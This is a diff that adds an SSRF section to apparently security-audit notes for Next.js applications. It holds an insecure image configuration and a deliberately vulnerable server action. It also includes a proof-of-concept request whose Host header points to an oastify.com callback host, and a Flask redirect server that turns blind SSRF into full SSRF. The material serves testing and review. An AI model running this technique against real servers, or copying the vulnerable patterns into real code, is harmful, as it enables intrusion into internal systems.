@@ -144,6 +144,85 @@ Check all regex with [https://github.com/makenowjust-labs/recheck](https://maken
 
 Mostly single page, check if origin is validated or a token is used.
 
+## SSRF
+
+Next.Js `Image` configuration can be abused to cause Blind SSRF.
+
+```
+ images: {
+    remotePatterns: [
+		{
+			protocol: "https",
+			hostname: "**",
+		},
+		{
+			protocol: "http",
+			hostname: "**",
+		},
+    ],
+  },
+```
+Above is an insecure remote patterns. Can also cause XSS with CDN domains as well if `dangerouslyAllowSVG` is set to `true`
+
+#### Server actions in older Next.js (`<v14.1.1.`) is vulnerable to SSRF since the host header is read from client.
+Vulnerable if server action is used, has a redirect to `/` and the `host` header can be tampared.
+
+Vulnerable code example:
+
+```
+"use server";
+
+import { redirect } from "next/navigation";
+
+export const handleSearch = async (data: FormData) => {
+  if (!userIsLoggedIn()) {
+    redirect("/login");
+    return;
+  }
+  // .. do other stuff ..
+};
+
+function userIsLoggedIn() {
+  return false;
+}
+```
+
+PoC:
+```
+POST /x HTTP/1.1
+Host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
+Content-Length: 4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+Next-Action: 15531bfa07ff11369239544516d26edbc537ff9c
+Connection: close
+
+{}
+```
+
+The `Next-Action` header denotes that a next action is used. The above blind SSRF can be turned into a reqular SSRF with a middleware server.
+
+```
+from flask import Flask, Response, request, redirect
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def catch(path):
+    if request.method == 'HEAD':
+        resp = Response("")
+        resp.headers['Content-Type'] = 'text/x-component'
+        return resp
+    return redirect('https://example.com')
+
+```
+
+Change the Host header to the flask server and set your target SSRF URL inside the flask server.
+
+How this works?
+- The Next.js server first does a preflight HEAD request to the URL.
+- If the preflight returns a Content-Type header of RSC_CONTENT_TYPE_HEADER, which is text/x-component, then NextJS makes a GET request to the same URL.
+- The content of that GET request is then returned in the response.
+
 ## Regex Search
 
 - API Keys: `[aA][pP][iI]_?[kK][eE][yY][=_:\\s-]+['|\"]?[0-9a-zA-Z]{32,45}['|\"]?`
@@ -167,3 +246,4 @@ semgrep --config "p/typescript" .
 - https://redux.js.org/usage/server-rendering#security-considerations
 - https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json
 - https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1
+- https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
